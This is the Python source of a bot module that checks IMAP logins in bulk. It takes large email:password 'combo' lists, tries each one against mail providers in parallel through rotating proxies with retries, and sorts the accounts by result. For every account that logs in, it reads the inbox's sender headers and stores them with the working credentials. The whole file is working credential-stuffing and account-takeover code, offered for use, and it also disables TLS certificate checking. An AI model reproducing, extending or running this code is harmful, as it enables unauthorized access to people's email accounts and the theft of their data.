"""IMAP checker — direct-only, parallel hosts, 993+143 STARTTLS, MX fallback.
Interface: run(job, reporter) matches bot.py's expected contract.
"""
# Q-01: removed dead imports base64, random, string
import concurrent.futures
import imaplib
import re
import socket
import ssl
import threading
import time

import requests

import config
from config import log  # Q-08: esc_html removed — never used in this file

# ═══════════════ CONFIG ═══════════════
IMAP_HOST_TIMEOUT = 5
IMAP_MX_TIMEOUT   = 3
IMAP_MAX_MESSAGES = config.IMAP_MAX_MESSAGES  # centralized in config.py
IMAP_FETCH_BATCH  = 400
IMAP_MAX_ATTEMPTS = 3

IMAP_SERVERS = {
    "gmail.com":"imap.gmail.com","googlemail.com":"imap.gmail.com",
    "outlook.com":"outlook.office365.com","hotmail.com":"outlook.office365.com",
    "live.com":"outlook.office365.com","msn.com":"outlook.office365.com",
    "yahoo.com":"imap.mail.yahoo.com","ymail.com":"imap.mail.yahoo.com",
    "aol.com":"imap.aol.com","aim.com":"imap.aol.com",
    "icloud.com":"imap.mail.me.com","me.com":"imap.mail.me.com","mac.com":"imap.mail.me.com",
    "gmx.com":"imap.gmx.com","gmx.net":"imap.gmx.net","gmx.de":"imap.gmx.net",
    "mail.com":"imap.mail.com","zoho.com":"imap.zoho.com",
    "yandex.com":"imap.yandex.com","yandex.ru":"imap.yandex.com",
    "web.de":"imap.web.de","t-online.de":"secureimap.t-online.de",
    "orange.fr":"imap.orange.fr","free.fr":"imap.free.fr","laposte.net":"imap.laposte.net",
    "libero.it":"imap.libero.it","seznam.cz":"imap.seznam.cz",
    "wp.pl":"imap.wp.pl","o2.pl":"imap.o2.pl","interia.pl":"imap.interia.pl",
    "naver.com":"imap.naver.com","qq.com":"imap.qq.com","163.com":"imap.163.com",
    "mail.ru":"imap.mail.ru","rambler.ru":"imap.rambler.ru","ukr.net":"imap.ukr.net",
    "fastmail.com":"imap.fastmail.com","fastmail.fm":"imap.fastmail.com",
    "fastmail.net":"imap.fastmail.com","fastmail.org":"imap.fastmail.com",
    "zoho.eu":"imap.zoho.eu","zohomail.com":"imap.zoho.com",
    "bk.ru":"imap.mail.ru","list.ru":"imap.mail.ru","inbox.ru":"imap.mail.ru",
    "freenet.de":"mx.freenet.de","gmx.at":"imap.gmx.net",
    "virgilio.it":"imap.virgilio.it","alice.it":"imap.alice.it",
    "onet.pl":"imap.poczta.onet.pl","tlen.pl":"imap.tlen.pl",
    "nate.com":"imap.nate.com","daum.net":"imap.daum.net",
    "126.com":"imap.126.com","sina.com":"imap.sina.com","sina.cn":"imap.sina.com",

}
NO_IMAP_DOMAINS = {
    "protonmail.com", "protonmail.ch", "proton.me", "pm.me",
    "tutanota.com", "tutanota.de", "tuta.io", "tutamail.com",
    "hey.com", "skiff.com",
}
MICROSOFT_DOMAINS = {
    "hotmail.com","hotmail.fr","hotmail.de","hotmail.it","hotmail.es",
    "hotmail.co.uk","hotmail.co.jp","hotmail.co.th","hotmail.se",
    "hotmail.co.nz","hotmail.gr","hotmail.ca","outlook.com","outlook.fr",
    "outlook.de","outlook.it","outlook.es","outlook.jp","outlook.sa",
    "outlook.com.br","outlook.cl","outlook.co","outlook.com.au",
    "outlook.com.ar","outlook.com.mx","outlook.at","outlook.be",
    "outlook.pt","outlook.dk","outlook.se","outlook.ch","live.com",
    "live.fr","live.de","live.it","live.no","live.cl","live.jp","live.nl",
    "live.ca","live.com.mx","live.com.ar","live.co.uk","live.at",
    "live.be","live.se","live.dk","live.pt","live.ie","live.cn",
    "live.com.pt","msn.com","msn.com.br","msn.com.mx","msn.cn","msn.co.uk",
}
EMAIL_IN_STR = re.compile(
    r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}")

# DNS pre-resolution cache: domain → (imap_host_or_None, timestamp)
# N-06: plain dict caused dead hosts to be cached forever on a 24/7 bot.
#        TTL = 1 hour — after that the entry is treated as a cache miss.
_DNS_TTL        = 3600
_dns_cache      = {}          # { domain: (host_or_None, float_timestamp) }
_dns_cache_lock = threading.Lock()


def _prebatch_dns(combos, workers=20, timeout=8):
    """Resolve IMAP hosts for all unknown domains before dispatching workers.
    Eliminates per-combo DNS latency for repeated domains."""
    unknown = set()
    for combo in combos:
        try:
            email = combo[0]
            if "@" not in email:
                continue
            domain = email.split("@", 1)[1].lower()
        except Exception:
            continue
        if _is_ms(email):
            continue
        if domain in IMAP_SERVERS:
            continue
        with _dns_cache_lock:
            entry = _dns_cache.get(domain)
            # N-06: treat stale or missing entries as unknown
            if entry is None or (time.time() - entry[1]) > _DNS_TTL:
                unknown.add(domain)

    if not unknown:
        return

    log("imap", f"pre-dns: resolving {len(unknown)} domains", "INFO")

    def _resolve_addr(host, port, timeout=3):
        """getaddrinfo with a hard timeout — Linux DNS can block 15-30s."""
        with concurrent.futures.ThreadPoolExecutor(max_workers=1) as _ex:
            fut = _ex.submit(socket.getaddrinfo, host, port,
                             socket.AF_UNSPEC, socket.SOCK_STREAM,
                             socket.IPPROTO_TCP)
            try:
                return fut.result(timeout=timeout)
            except (concurrent.futures.TimeoutError, socket.gaierror):
                return None

    def _resolve(domain):
        for host in (f"imap.{domain}", f"mail.{domain}", f"webmail.{domain}"):
            if _resolve_addr(host, 993, timeout=3):
                with _dns_cache_lock:
                    _dns_cache[domain] = (host, time.time())
                return
        for mx_host in _mx_hosts(domain, timeout=2):
            if _resolve_addr(mx_host, 993, timeout=3):
                with _dns_cache_lock:
                    _dns_cache[domain] = (mx_host, time.time())
                return
        with _dns_cache_lock:
            _dns_cache[domain] = (None, time.time())  # confirmed: no IMAP

    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(_resolve, d): d for d in unknown}
        try:
            for _ in concurrent.futures.as_completed(futs, timeout=timeout):
                pass
        except concurrent.futures.TimeoutError:
            log("imap", "pre-dns: timeout — some domains unresolved", "WARN")

    resolved = sum(1 for d in unknown
                   if _dns_cache.get(d, (None, 0))[0] is not None)
    log("imap", f"pre-dns: {resolved}/{len(unknown)} resolved", "INFO")


def _is_ms(email):
    if "@" not in email: return False
    d = email.split("@", 1)[1].lower()
    return (d in MICROSOFT_DOMAINS or d in NO_IMAP_DOMAINS or d.startswith(
        ("hotmail.", "outlook.", "live.", "msn.", "windowslive.")))


# ═══════════════ MX lookup ═══════════════
def _mx_hosts(domain, timeout=IMAP_MX_TIMEOUT):
    """S-04 note: MX lookup goes to dns.google without proxy. If anonymity
    matters, pass the proxy here. Currently left direct for latency."""
    try:
        r = requests.get("https://dns.google/resolve",
                         params={"name": domain, "type": "MX"}, timeout=timeout)
        if r.status_code != 200:
            return []
        answers = (r.json().get("Answer") or [])
        out = []
        for a in answers:
            if a.get("type") != 15: continue
            parts = a["data"].split()
            if len(parts) < 2: continue
            mx = parts[1].rstrip(".").lower()
            out.append(mx)
            base = None
            for pref in ("mail.", "mx.", "smtp.", "smtp-in.",
                         "mx1.", "mx2.", "mx01.", "mx02."):
                if mx.startswith(pref):
                    base = mx[len(pref):]; break
            if base:
                out.append(f"imap.{base}")
                out.append(f"mail.{base}")
            else:
                out.append(f"imap.{mx}")
        return out
    except Exception:
        return []


# ═══════════════ Classify ═══════════════
def _classify(steps_text):
    t = steps_text.upper()
    # Yellow 3 fix: "BUSY" bare word causes false positives on servers that
    # include it in welcome banners (e.g. "server is busy with X connections").
    # Require bracketed form "[BUSY]" which is the RFC-style error tag.
    if any(x in t for x in ("TOO MANY", "[LIMIT]", "[UNAVAILABLE]",
                            "TEMPORARY", "TRY AGAIN", "THROTTLE",
                            "[BUSY]", "SLOW DOWN")):
        return "RATE_LIMITED"
    if any(x in t for x in ("[DISABLED]", "SUSPENDED", "LOCKED", "ACCOUNT CLOSED")):
        return "ACCOUNT_LOCKED"
    if "[EXPIRED]" in t or "PASSWORD EXPIRED" in t:
        return "PASSWORD_EXPIRED"
    return "REJECTED"


try:
    import socks
    from urllib.parse import urlparse as _urlparse
    _SOCKS_OK = True
except ImportError:
    _SOCKS_OK = False


def _create_proxied_socket(host, port, timeout, proxy_url=None):
    if not proxy_url or not _SOCKS_OK:
        return socket.create_connection((host, port), timeout)
    p = _urlparse(proxy_url if "://" in proxy_url else f"http://{proxy_url}")
    scheme = (p.scheme or "http").lower()
    ptype = socks.SOCKS5 if "socks5" in scheme else (socks.SOCKS4 if "socks4" in scheme else socks.HTTP)
    s = socks.socksocket()
    s.set_proxy(ptype, p.hostname, p.port, username=p.username, password=p.password)
    s.settimeout(timeout)
    s.connect((host, port))
    return s


class _ProxiedIMAP4_SSL(imaplib.IMAP4_SSL):
    def __init__(self, host="", port=993, ssl_context=None, timeout=None, proxy_url=None):
        self._proxy_url = proxy_url
        super().__init__(host=host, port=port, ssl_context=ssl_context, timeout=timeout)

    def _create_socket(self, timeout):
        sock = _create_proxied_socket(self.host, self.port, timeout, self._proxy_url)
        return self.ssl_context.wrap_socket(sock, server_hostname=self.host)


class _ProxiedIMAP4(imaplib.IMAP4):
    def __init__(self, host="", port=143, timeout=None, proxy_url=None):
        self._proxy_url = proxy_url
        super().__init__(host=host, port=port, timeout=timeout)

    def _create_socket(self, timeout):
        return _create_proxied_socket(self.host, self.port, timeout, self._proxy_url)


class IMAPLoginError(Exception):
    pass


class IMAPChecker:
    def __init__(self, email, password, proxy_url=None):
        self.email     = email
        self.password  = password
        self.proxy_url = proxy_url
        self.domain   = email.split("@", 1)[1].lower()
        self.imap     = None
        self.host     = None
        self.port     = None

    def _candidates(self):
        if self.domain in IMAP_SERVERS:
            mapped = IMAP_SERVERS[self.domain]
            if mapped == "127.0.0.1": return []
            return [(mapped, 993), (mapped, 143)]

        # Fast path: pre-resolved by _prebatch_dns
        # N-06: read (host_or_None, timestamp) tuple and check TTL
        with _dns_cache_lock:
            _raw = _dns_cache.get(self.domain)

        if _raw is not None and (time.time() - _raw[1]) <= _DNS_TTL:
            cached = _raw[0]
            if cached is None:
                return []   # confirmed dead — skip entirely
            cands = [(cached, 993), (cached, 143)]
            std = f"imap.{self.domain}"
            if cached != std:
                cands.append((std, 993))  # fallback if cached host degrades
            return cands

        # Slow path: full discovery (no cache hit)
        cands = [
            (f"imap.{self.domain}", 993),
            (f"imap.{self.domain}", 143),
            (f"mail.{self.domain}", 993),
            (f"mail.{self.domain}", 143),
            (f"webmail.{self.domain}", 993),
            (f"webmail.{self.domain}", 143),
        ]
        for host in _mx_hosts(self.domain):
            cands.append((host, 993))
            cands.append((host, 143))

        seen, unique = set(), []
        for h, p in cands:
            if (h, p) in seen: continue
            seen.add((h, p)); unique.append((h, p))
        return unique

    def _try_login(self, imap, steps):
        try:
            typ, data = imap.login(self.email, self.password)
            steps.append(f"LOGIN: {typ} {data!r}")
            if typ == "OK": return True
        except imaplib.IMAP4.error as e:
            steps.append(f"LOGIN err: {e!r}")
        except Exception as e:
            steps.append(f"LOGIN exc: {type(e).__name__}")

        try:
            typ, data = imap.authenticate(
                "PLAIN", lambda _: f"\0{self.email}\0{self.password}".encode())
            steps.append(f"AUTH-PLAIN: {typ} {data!r}")
            if typ == "OK": return True
        except imaplib.IMAP4.error as e:
            steps.append(f"AUTH-PLAIN err: {e!r}")
        except Exception as e:
            steps.append(f"AUTH-PLAIN exc: {type(e).__name__}")

        try:
            phase = {"n": 0}
            def _auth(chal):
                phase["n"] += 1
                return (self.email.encode() if phase["n"] == 1
                        else self.password.encode())
            typ, data = imap.authenticate("LOGIN", _auth)
            steps.append(f"AUTH-LOGIN: {typ} {data!r}")
            if typ == "OK": return True
        except imaplib.IMAP4.error as e:
            steps.append(f"AUTH-LOGIN err: {e!r}")
        except Exception as e:
            steps.append(f"AUTH-LOGIN exc: {type(e).__name__}")

        return False

    def _probe(self, host, port):
        result = {"host": host, "port": port, "status": None,
                  "steps": [], "imap_obj": None}
        imap = None
        try:
            if port == 993:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                imap = _ProxiedIMAP4_SSL(host, port, ssl_context=ctx,
                                          timeout=IMAP_HOST_TIMEOUT, proxy_url=self.proxy_url)
            else:
                imap = _ProxiedIMAP4(host, port, timeout=IMAP_HOST_TIMEOUT, proxy_url=self.proxy_url)
                try:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    imap.starttls(ssl_context=ctx)
                    result["steps"].append(f"{host}:143 STARTTLS OK")
                except Exception as e:
                    result["steps"].append(
                        f"{host}:143 STARTTLS fail: {type(e).__name__}")
                    try: imap.logout()
                    except Exception: pass
                    result["status"] = "STARTTLS_FAIL"
                    return result
            result["steps"].append(f"CONNECT OK {host}:{port}")
        except socket.timeout:
            result["status"] = "TIMEOUT"; return result
        except socket.gaierror:
            result["status"] = "DNS_FAIL"; return result
        except ConnectionRefusedError:
            result["status"] = "CONN_REFUSED"; return result
        except ssl.SSLError:
            result["status"] = "SSL_ERROR"; return result
        except Exception as e:
            result["status"] = "UNREACHABLE"
            result["error"] = f"{type(e).__name__}: {e}"
            return result

        try:
            if self._try_login(imap, result["steps"]):
                result["status"] = "OK"
                result["imap_obj"] = imap
                return result
            result["status"] = _classify(" | ".join(result["steps"]))
        except Exception as e:
            result["status"] = "UNREACHABLE"
            result["error"] = f"{type(e).__name__}: {e}"

        try: imap.logout()
        except Exception: pass
        return result

    def login(self):
        candidates = self._candidates()
        if not candidates:
            raise IMAPLoginError("NO_HOST")

        ex = concurrent.futures.ThreadPoolExecutor(
            max_workers=min(len(candidates), 6))
        futures = {ex.submit(self._probe, h, p): (h, p)
                   for h, p in candidates}
        winner   = None
        attempts = []
        try:
            pending = set(futures)
            while pending:
                done, pending = concurrent.futures.wait(
                    pending, timeout=IMAP_HOST_TIMEOUT + 2,
                    return_when=concurrent.futures.FIRST_COMPLETED)
                for f in done:
                    h, p = futures[f]
                    try:
                        result = f.result()
                    except IMAPLoginError as e:
                        result = {"status": str(e), "host": h, "port": p}
                    except Exception as e:
                        result = {"status": "UNREACHABLE", "host": h,
                                  "port": p, "error": str(e)}
                    attempts.append(result)
                    if result.get("status") == "OK" and not winner:
                        winner = result
                if winner:
                    break
        finally:
            # B-03: cancel_futures=True is Python 3.9+; wrap for 3.8 compat
            try:
                ex.shutdown(wait=False, cancel_futures=True)
            except TypeError:
                ex.shutdown(wait=False)

            # P-04: give in-flight futures a moment to land so we can logout
            # connections that succeeded AFTER we already picked a winner.
            time.sleep(0.5)
            for f, (h, p) in futures.items():
                if f.done() and not f.cancelled():
                    try:
                        r = f.result(timeout=0)  # non-blocking — already done
                    except Exception:
                        continue
                    if r.get("status") == "OK" and r.get("imap_obj") and (
                            not winner or r["host"] != winner["host"]
                            or r["port"] != winner["port"]):
                        try: r["imap_obj"].logout()
                        except Exception: pass

        if winner:
            self.host = winner["host"]
            self.port = winner["port"]
            self.imap = winner.get("imap_obj")
            return

        statuses = [a.get("status") for a in attempts]
        for st in ("REJECTED", "ACCOUNT_LOCKED", "PASSWORD_EXPIRED",
                   "RATE_LIMITED"):
            if st in statuses:
                raise IMAPLoginError(st)
        raise IMAPLoginError("UNREACHABLE")

    def collect_senders(self, max_messages=IMAP_MAX_MESSAGES):
        if not self.imap: return {}, 0
        # Bug 6 fix: some servers (mail.ru, yandex) have localized folder names.
        # RFC 3501 mandates INBOX is case-insensitive but implementations vary.
        # Try "INBOX" first, then fall back to the first folder with \Inbox flag.
        inbox_name = "INBOX"
        try:
            typ, _ = self.imap.select("INBOX", readonly=True)
            if typ != "OK":
                # Fallback: LIST and find folder with \Inbox attribute
                try:
                    lt, ld = self.imap.list()
                    if lt == "OK" and ld:
                        for entry in ld:
                            if not isinstance(entry, bytes):
                                continue
                            decoded = entry.decode("utf-8", errors="ignore")
                            if r"\Inbox" in decoded or "inbox" in decoded.lower():
                                parts = decoded.rsplit('"."', 1)
                                if len(parts) == 2:
                                    candidate = parts[1].strip().strip('"')
                                    t2, _ = self.imap.select(candidate, readonly=True)
                                    if t2 == "OK":
                                        inbox_name = candidate
                                        break
                except Exception:
                    pass
                # If we still couldn't select anything, bail out
                if typ != "OK" and inbox_name == "INBOX":
                    return {}, 0
        except Exception:
            return {}, 0
        senders = {}
        total   = 0
        try:
            typ, data = self.imap.search(None, "ALL")
            if typ != "OK" or not data or not data[0]: return {}, 0
            uids = data[0].split(); total = len(uids)
            if len(uids) > max_messages: uids = uids[-max_messages:]
            for i in range(0, len(uids), IMAP_FETCH_BATCH):
                batch   = uids[i:i + IMAP_FETCH_BATCH]
                uid_str = b",".join(batch).decode()
                try:
                    typ, msg_data = self.imap.fetch(
                        uid_str, "(BODY.PEEK[HEADER.FIELDS (FROM)])")
                    if typ != "OK": continue
                    for part in msg_data:
                        if not isinstance(part, tuple): continue
                        header = part[1]
                        if isinstance(header, bytes):
                            header = header.decode("utf-8", errors="ignore")
                        m = EMAIL_IN_STR.search(header or "")
                        if m:
                            k = m.group(0).lower()
                            senders[k] = senders.get(k, 0) + 1
                except Exception:
                    continue
        except Exception:
            pass
        return senders, total

    def logout(self):
        if self.imap:
            try: self.imap.logout()
            except Exception: pass
            self.imap = None


# ═══════════════ PER-COMBO ═══════════════
def _check_one(job, combo):
    try:
        _check_one_inner(job, combo)
    finally:
        try:
            with job.lock:
                job.done_keys.add((combo[0].lower(), combo[1]))
        except Exception:
            pass

def _check_one_inner(job, combo):
    try:
        email, pw = combo[0], combo[1]
        meta = combo[2] if len(combo) > 2 else {}
    except Exception:
        with job.lock:
            job.processed += 1; job.bad += 1
        return

    if _is_ms(email):
        with job.lock:
            job.processed += 1; job.skip += 1
        return

    prev_proxy  = None
    last_status = None
    for attempt in range(IMAP_MAX_ATTEMPTS):
        if job.cancelled:
            with job.lock:
                job.processed += 1
            return
        if attempt > 0:
            with job.lock:
                job.retried += 1
        proxy_url = None
        if getattr(config, "IMAP_USE_PROXY", False):
            proxy_url, _ = config.get_proxy_for_attempt(attempt, prev_proxy=prev_proxy)
            prev_proxy = proxy_url
        checker = IMAPChecker(email, pw, proxy_url=proxy_url)
        try:
            checker.login()
            senders, total = checker.collect_senders()
            if config.DEBUG_IMAP:
                log("imap-dbg",
                    f"{email} OK host={checker.host} total={total} senders={len(senders)}",
                    "DEBUG")
            domains = {}
            for snd, cnt in senders.items():
                if "@" in snd:
                    dom = snd.split("@", 1)[1].lower()
                    domains[dom] = domains.get(dom, 0) + cnt
            with job.lock:
                job.processed += 1
                job.valid     += 1
                if attempt > 0: job.recovered += 1
                job.extracted += 1
                job.valid_list.append((
                    email, pw,
                    {"senders": senders, "domains": domains,
                     "total": total, "server": checker.host or "", **meta}
                ))
            return
        except IMAPLoginError as e:
            last_status = str(e)
            reason = last_status.split(":", 1)[0]
            if config.DEBUG_IMAP:
                log("imap-dbg",
                    f"{email} attempt={attempt} IMAPLoginError reason={reason}",
                    "DEBUG")
            if reason in ("REJECTED", "NO_HOST"):
                with job.lock: job.processed += 1; job.bad += 1
                return
            if reason == "ACCOUNT_LOCKED":
                with job.lock: job.processed += 1; job.imap_locked += 1
                return
            if reason == "PASSWORD_EXPIRED":
                with job.lock: job.processed += 1; job.imap_expired += 1
                return
            if reason == "RATE_LIMITED":
                if attempt < IMAP_MAX_ATTEMPTS - 1:
                    time.sleep(1.5); continue
                with job.lock: job.processed += 1; job.imap_rate_limited += 1
                return
            if attempt < IMAP_MAX_ATTEMPTS - 1:
                time.sleep(0.5); continue
        except Exception as e:
            last_status = type(e).__name__
            if config.DEBUG_IMAP:
                log("imap-dbg",
                    f"{email} attempt={attempt} exc={last_status}: {e}",
                    "DEBUG")
            if attempt < IMAP_MAX_ATTEMPTS - 1:
                time.sleep(0.5); continue
        finally:
            try: checker.logout()
            except: pass

    with job.lock:
        job.processed += 1
        job.net       += 1


# ═══════════════ JOB RUNNER ═══════════════
def run(job, reporter):
    """Entry point called by bot.py."""
    workers = config.IMAP_THREADS
    log("imap", f"start chat={job.chat_id} combos={len(job.combos)} workers={workers}",
        level="INFO")

    # Pre-filter MS-domain combos — avoids spawning threads just to skip them
    combos     = [c for c in job.combos if not _is_ms(c[0])]
    ms_skipped = len(job.combos) - len(combos)
    if ms_skipped:
        with job.lock:
            job.processed += ms_skipped
            job.skip      += ms_skipped
        log("imap", f"pre-filtered {ms_skipped} MS-domain combos", "INFO")

    if not combos:
        return

    # Bulk DNS resolution before dispatching — eliminates per-combo DNS latency
    _prebatch_dns(combos)

    done_evt = threading.Event()

    def _watcher():
        while not done_evt.is_set():
            try:
                reporter()
            except Exception as e:
                log("imap", f"reporter: {e}", "WARN")
            done_evt.wait(3)

    threading.Thread(target=_watcher, daemon=True).start()

    # M-01: chunked submission — keep at most workers*2 futures alive at once.
    # Submitting all futures upfront for a 500k list creates 500k objects in RAM.
    # M-02: done_evt.set() + reporter(force=True) in finally — guarantees the
    # watcher thread is stopped and final flush happens even on OOM/KeyboardInterrupt.
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
            pending = set()
            for combo in combos:
                if job.cancelled:
                    break
                while len(pending) >= workers * 2:
                    done, pending = concurrent.futures.wait(
                        pending,
                        return_when=concurrent.futures.FIRST_COMPLETED)
                    if job.cancelled:
                        break
                if job.cancelled:
                    break
                pending.add(ex.submit(_check_one, job, combo))
            # drain remainder
            for _ in concurrent.futures.as_completed(pending):
                if job.cancelled:
                    for f in pending:
                        f.cancel()
                    break
    finally:
        done_evt.set()
        try: reporter(force=True)
        except Exception: pass

    log("imap", f"done chat={job.chat_id} valid={job.valid} bad={job.bad} "
                f"net={job.net} skip={job.skip}", level="DONE")
